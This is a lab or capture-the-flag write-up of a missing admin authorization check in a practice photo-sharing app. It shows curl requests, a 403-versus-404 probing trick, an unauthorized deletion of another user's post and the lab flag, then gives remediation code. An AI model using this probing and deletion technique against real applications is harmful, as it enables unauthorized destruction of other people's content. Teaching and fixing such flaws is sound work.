# BugForge Daily Lab — Broken Access Control Walkthrough

**Target:** `https://lab-1781792275756-abwndb.labs-app.bugforge.io/`
**Application:** "Ottergram" — an Instagram-style otter photo-sharing SPA (React frontend + Express/Node API)
**Vulnerability class:** Broken Access Control (OWASP A01:2021) — missing function-level authorization on a destructive admin endpoint
**Flag:** `bug{CGPkbWRXGmG8WODPoaLuDCmscIKUPbNN}`

---

## 1. Summary

The application exposes admin-only post-moderation endpoints under `/api/admin/...`. Server-side authorization (an "admin required" middleware) is correctly applied to **most** of these routes — but it is **missing on the `DELETE /api/admin/posts/:id` route**. As a result, any authenticated regular user can delete any post in the application, an action that is supposed to be restricted to administrators. Performing this unauthorized action returns the flag.

The frontend hides the admin UI from non-admin users (the "🔧" admin button only renders when `user.role === "admin"`), which gives a false sense of security. Access control enforced only in the client is no enforcement at all.

---

## 2. Reconnaissance

### 2.1 Identify the app and its API

The login page is a React single-page app. Fetching it shows a bundled JS file:

```bash
curl -s https://lab-1781792275756-abwndb.labs-app.bugforge.io/login
# -> <title>Ottergram</title> ... <script defer src="/static/js/main.49fc4dc1.js">
```

Downloading and grepping the bundle reveals the full API surface:

```
POST   /api/login
POST   /api/register
GET    /api/verify-token
GET    /api/posts
GET    /api/posts/:id/comments      POST /api/posts/:id/comments
POST   /api/posts/:id/like          DELETE /api/posts/:id/like
GET    /api/profile/:username       PUT  /api/profile
GET    /api/admin                   <-- admin gate check
GET    /api/admin/flagged-posts     <-- admin: list flagged posts
POST   /api/admin/posts/:id/approve <-- admin: approve a flagged post
DELETE /api/admin/posts/:id         <-- admin: delete a post
```

### 2.2 Client-side-only admin gating

The bundle shows the admin area is gated **only in the browser**:

```js
// Navbar: admin button rendered only for admins
"admin" === n.role && jsx("button", { onClick: () => e("/admin") ... })

// Admin page guard (client side)
if (p && "admin" === p.role) { await ir.get("/api/admin"); /* load page */ }
else h("/");   // redirect non-admins away
```

This is purely cosmetic — the endpoints can be called directly with any valid token.

### 2.3 Auth model

Registering returns a JWT plus the user object:

```json
{"token":"eyJ...","user":{"id":4,"username":"otterhunter9","role":"user"}}
```

The JWT payload decodes to `{"id":4,"username":"otterhunter9","iat":...}` — **role is *not* in the token**, so the server looks up the role from the database per request. This means the role cannot simply be forged by editing the JWT, and it correctly rules out a few dead ends (below).

---

## 3. Exploitation

### 3.1 Get a normal account

```bash
curl -s -X POST .../api/register \
  -H "Content-Type: application/json" \
  --data-raw '{"username":"otterhunter9","email":"otterhunter9@example.com","password":"Passw0rd123","full_name":"Otter Hunter"}'
```

Returns a token for user id 4 with `"role":"user"`.

### 3.2 Dead ends (what was correctly defended)

These were tested first and are **not** vulnerable — useful to document so the real flaw stands out:

| Attempt | Request | Result |
|---|---|---|
| Read admin gate | `GET /api/admin` | `403 {"error":"Admin access required"}` |
| List flagged posts | `GET /api/admin/flagged-posts` | `403 Admin access required` |
| Approve a post | `POST /api/admin/posts/9999/approve` | `403 Admin access required` (admin check runs *before* the post lookup) |
| Mass-assignment / priv-esc | `PUT /api/profile` with `{"role":"admin"}` | `200`, but role stays `"user"` — the server ignores the field |

### 3.3 Finding the gap — response-code differential

The breakthrough is comparing two admin endpoints with a **non-existent** post id, as a regular user:

```bash
# approve -> hits the admin middleware first
curl -X POST  .../api/admin/posts/9999/approve  -H "Authorization: Bearer $TOKEN"
# 403 {"error":"Admin access required"}

# delete -> SKIPS the admin middleware, goes straight to the DB lookup
curl -X DELETE .../api/admin/posts/9999         -H "Authorization: Bearer $TOKEN"
# 404 {"error":"Post not found"}
```

The `DELETE` route returns **"Post not found" (404)** instead of **"Admin access required" (403)**. That difference proves the admin authorization middleware was never attached to `DELETE /api/admin/posts/:id` — the request reaches the post-lookup logic without any role check.

### 3.4 Trigger the vulnerability

Delete a real post (id 5, owned by the `admin` user) as the regular user:

```bash
curl -s -X DELETE \
  https://lab-1781792275756-abwndb.labs-app.bugforge.io/api/admin/posts/5 \
  -H "Authorization: Bearer <regular-user-JWT>"
```

Response:

```json
{"message":"Post deleted successfully","flag":"bug{CGPkbWRXGmG8WODPoaLuDCmscIKUPbNN}"}
```

A regular user successfully performed an administrator-only destructive action, and the lab returned the flag.

---

## 4. Flag

```
bug{CGPkbWRXGmG8WODPoaLuDCmscIKUPbNN}
```

---

## 5. Root cause

The route group under `/api/admin/*` should all sit behind an authorization middleware such as `requireAdmin`. The middleware was applied to:

- `GET  /api/admin`
- `GET  /api/admin/flagged-posts`
- `POST /api/admin/posts/:id/approve`

…but it was **omitted on `DELETE /api/admin/posts/:id`**. The handler only verified that the caller had a valid token (authentication), not that the caller was an admin (authorization). This is a textbook **missing function-level access control**.

The frontend's `role === "admin"` checks are irrelevant to security because an attacker calls the API directly and never executes the client-side guard.

---

## 6. Impact

- **Integrity / availability:** Any registered user can permanently delete *any* post belonging to *any* user (including the administrator). This is destructive and irreversible.
- **Trust boundary bypass:** Moderation/admin capabilities are exposed to ordinary users.
- In a real product this enables vandalism, censorship, and targeted removal of content at scale.

---

## 7. Remediation

1. **Enforce authorization server-side on every admin route.** Apply the `requireAdmin` middleware to the *entire* `/api/admin` router rather than per-handler, so a route cannot be added without it:
   ```js
   const adminRouter = express.Router();
   adminRouter.use(authenticate, requireAdmin);   // applies to ALL admin routes
   adminRouter.get('/flagged-posts', ...);
   adminRouter.post('/posts/:id/approve', ...);
   adminRouter.delete('/posts/:id', ...);          // now protected automatically
   app.use('/api/admin', adminRouter);
   ```
2. **Deny by default.** Treat missing/unknown authorization as a denial; never rely on client-side hiding of UI as an access-control mechanism.
3. **Add automated tests** that assert a non-admin token receives `403` on *every* admin route (including destructive verbs), preventing regressions.
4. **Consistent error semantics:** return the authorization decision (403) before performing resource lookups, so the response does not leak which endpoints lack the guard.
5. **Audit logging & soft-delete** for destructive admin actions to enable detection and recovery.

---

## 8. Timeline of testing commands

| # | Action | Outcome |
|---|---|---|
| 1 | `GET /login`, download `main.js` | Identified SPA + API routes |
| 2 | `POST /api/register` | Obtained regular-user JWT (id 4, role user) |
| 3 | `GET /api/admin`, `/api/admin/flagged-posts` | `403` — properly protected |
| 4 | `PUT /api/profile {role:"admin"}` | Ignored — no mass-assignment |
| 5 | `POST /api/admin/posts/9999/approve` | `403` — protected |
| 6 | `DELETE /api/admin/posts/9999` | `404` — **unprotected (differential leak)** |
| 7 | `DELETE /api/admin/posts/5` | `200` + **flag** |
